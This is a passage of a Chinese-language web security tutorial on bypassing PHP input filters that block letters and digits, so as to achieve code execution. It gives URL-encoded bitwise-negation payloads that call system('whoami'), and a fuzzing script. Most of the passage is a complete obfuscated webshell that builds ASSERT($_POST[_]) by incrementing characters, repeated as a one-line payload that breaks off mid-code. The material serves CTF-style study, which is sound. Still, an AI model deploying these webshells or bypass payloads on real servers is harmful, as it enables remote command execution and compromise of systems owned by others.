<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201039.png" alt="在这里插入图片描述"><br><strong>传payload的时候进行一次URL编码。然后传入POST传参：2=phpinfo</strong><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201040.png" alt="在这里插入图片描述"><br>也是PHP 7.0.12及以下版本有效，估计还是assert()的问题<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201041.png" alt="在这里插入图片描述"><br>取反中文字符fuzz的PHP脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">&lt;</span>?php 
error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
header<span class="token punctuation">(</span><span class="token string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

function str_split_unicode<span class="token punctuation">(</span>$str<span class="token punctuation">,</span> $l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>$l <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $ret <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        $len <span class="token operator">=</span> mb_strlen<span class="token punctuation">(</span>$str<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>$i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> $i <span class="token operator">&lt;</span> $len<span class="token punctuation">;</span> $i <span class="token operator">+=</span> $l<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            $ret<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> mb_substr<span class="token punctuation">(</span>$str<span class="token punctuation">,</span> $i<span class="token punctuation">,</span> $l<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> $ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> preg_split<span class="token punctuation">(</span><span class="token string">"//u"</span><span class="token punctuation">,</span> $str<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> PREG_SPLIT_NO_EMPTY<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

$s <span class="token operator">=</span> <span class="token string">'当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之'</span><span class="token punctuation">;</span>

$arr_str<span class="token operator">=</span>str_split_unicode<span class="token punctuation">(</span>$s<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span>$i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> $i <span class="token operator">&lt;</span> strlen<span class="token punctuation">(</span>$s<span class="token punctuation">)</span> <span class="token punctuation">;</span> $i<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    echo $arr_str<span class="token punctuation">[</span>$i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'-->'</span><span class="token punctuation">.</span><span class="token operator">~</span>$arr_str<span class="token punctuation">[</span>$i<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
 ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201042.png" alt="在这里插入图片描述"></p>
<h1 id="URL编码取反绕过（最简单的）"><a href="#URL编码取反绕过（最简单的）" class="headerlink" title="URL编码取反绕过（最简单的）"></a>URL编码取反绕过（最简单的）</h1><p>注意： 该方法只适用于PHP7<br><strong>对想要传入的参数，先进行URL解码再取反</strong></p>
<p>例如传入构造一个phpinfo();（生成payload的时候先取反再URL编码）<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201043.png" alt="在这里插入图片描述"><br>因为没有过滤 ()，所以只需要取反编码phpinfo就行。<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201044.png" alt="在这里插入图片描述"><br>phpinfo()是没有参数的，如果需要执行有参数的函数，比如system(“whoami”);<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201045.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201046.png" alt="在这里插入图片描述"></p>
<h1 id="递增递减运算符绕过"><a href="#递增递减运算符绕过" class="headerlink" title="递增递减运算符绕过"></a>递增递减运算符绕过</h1><p>这里笔者就没什么补充的了，直接搬运P师傅的吧<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201047.png" alt="在这里插入图片描述"><br><strong>也就是说，‘a’++ =&gt; ‘b’，‘b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</strong><br>那么，如何拿到一个值为字符串’a’的变量呢？<br><strong>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</strong></p>
<p>在PHP中，如果强制连接 数组 和 字符串 的话，<strong>数组将被转换成字符串</strong>，其值为Array：<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201048.png" alt="在这里插入图片描述"><br>再取这个字符串的第一个字母，就可以获得’A’了。<br>利用这个技巧，编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($POST[ _ ])，无需获取小写a）：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_='Array';</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_=$_[0];</span>
<span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// A</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span>
<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// E </span>
<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// R</span>
<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span>
<span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>

<span class="token variable">$____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// P</span>
<span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// O</span>
<span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span>
<span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span>
<span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>

<span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$____</span><span class="token punctuation">;</span>
<span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ASSERT($_POST[_]);</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用payload：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string">"$_"</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span 